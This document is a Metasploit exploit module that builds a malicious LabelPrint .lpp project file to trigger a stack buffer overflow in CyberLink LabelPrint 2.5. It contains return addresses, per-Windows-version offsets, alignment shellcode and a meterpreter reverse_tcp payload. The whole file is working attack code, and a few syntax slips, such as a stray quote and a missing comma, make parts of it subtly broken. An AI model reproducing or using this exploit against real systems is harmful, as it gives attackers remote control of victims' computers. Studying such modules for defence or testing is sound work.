class MetasploitModule < Msf::Exploit
    Rank = GreatRanking

    include Msf::Exploit::FILEFORMAT

    def initialize(info={})
        super(update_info(info,
        'Name'          => "CyberLink LabelPrint 2.5 Stack Buffer Overflow",
        'Description'   => %q{
        "This module exploits a stack buffer overflow in CyberLink LabelPrint 2.5 and below.
        The vulnerability is triggered when opening a .lpp project file containing overly long string characters
        via open file menu.").
        },
        'License'       => MSF_LICENSE
        'DefaultOptions'  =>
        {
          'FILENAME' => 'msf.lpp',
          'EXITFUNC' => 'seh',
          'DisablePayloadHandler' => 'true',
          'PAYLOAD' => 'windows/meterpreter/reverse_tcp'
        },
      'Platform'        => 'win',
      'Targets'         =>
        [
          ['CyberLink LabelPrint <= 2.5 on Windows 7 (64 bit)',
            {
              'Ret' => "\x2c\x44",
              'Offset' => 790,
              'Padding1' => 857,
              'Padding2' => 104
            }
          ],
          ['CyberLink LabelPrint <= 2.5 on Windows 8.1 x64',
            {
              'Ret' => "\x2c\x44",
              'Offset' => 790,
              'Padding1' => 845,
              'Padding2' => 116
            }
          ],
          ['CyberLink LabelPrint <= 2.5 on Windows 10 x64 build 1803',
            {
              'Ret' => "\x2c\x44",
              'Offset' => 790,
              'Padding1' => 781,
              'Padding2' => 180
            }
          ],
        ],
      'Payload'         =>
        {
          'Space'       => 15000,
          'DisableNops' => true
        },
      'DisclosureDate'  => 'Sep 23 2017',
      'DefaultTarget'   => 0))
    end

    def get_payload(hunter)
        enc = framework.encoders.create('x86/unicode_mixed')
        enc.datastore.import_options_from_hash({ 'BufferRegister' => 'EAX' })
        hunter = enc.encode(hunter, nil, nil, platform)
      end
    
      def exploit
        nop = "\x42"
        junk = 'ABC'.split('').sample              
        buffer = ""
        buffer << junk * target['Offset']
        buffer << "\x61\x42"      
        buffer << target['Ret']   
        buffer << nop             
        buffer << "\x54"        
        buffer << nop              
        buffer << "\x58"        
        buffer << nop             
        buffer << "\x05\x1B\x01"  
        buffer << nop             
        buffer << "\x2d\x01\x01"   
        buffer << nop             
        buffer << "\x50"         
        buffer << nop             
        buffer << "\x5c"       
        buffer << nop          
        buffer << "\x25\x7e\x7e"   
        buffer << nop           
        buffer << "\x25\x01\x01"   
        buffer << nop              
        buffer << "\x35\x7f\x7f"  
        buffer << nop          
        buffer << "\x05\x44\x44"
        buffer << nop          
        buffer << "\x57"           
        buffer << nop              
        buffer << "\x50"           
        buffer << junk * target['Padding1'] 
        buffer << "\x58"           
        buffer << nop              
        buffer << "\x58"           
        buffer << nop              
        buffer << "\x05\x09\x01"   
        buffer << nop              
        buffer << "\x2d\x01\x01"   
        buffer << nop              
        buffer << "\x50"           
        buffer << nop              
        buffer << "\x5C"           
        buffer << nop              
        buffer << "\x58"           
        buffer << nop             
        buffer << "\x05\x53\x7c"   
        buffer << nop              
        buffer << "\x50"           
        buffer << junk * target['Padding2'] 
        buffer << "\x7b\x32"       
        buffer << junk * 114       
        buffer << "\x57"           
        buffer << nop              
        buffer << "\x58"        
        buffer << nop              
        buffer << "\x05\x0A\x01"   
        buffer << nop            
        buffer << "\x2d\x01\x01"   
        buffer << nop              
        buffer << get_payload(payload.encoded)
        buffer << junk * (payload.space-buffer.length)

        lpp_data = <<-EOS
        <PROJECT version="1.0.00">
            <INFORMATION title="" author="" date="#{rand(1..12)}/#{rand(1..28)}/#{(1970..2020).to_a.sample}" SystemTime="#{rand(1..12)}/#{rand(1..28)}/#{(1970..2020).to_a.sample}">
                <TRACK name="#{buffer}" />
            </INFORMATION>
        </PROJECT>
        EOS

        print_status("Creating '#{datastore['FILENAME']}' file ...")
        file_create(lpp_data)
    end
end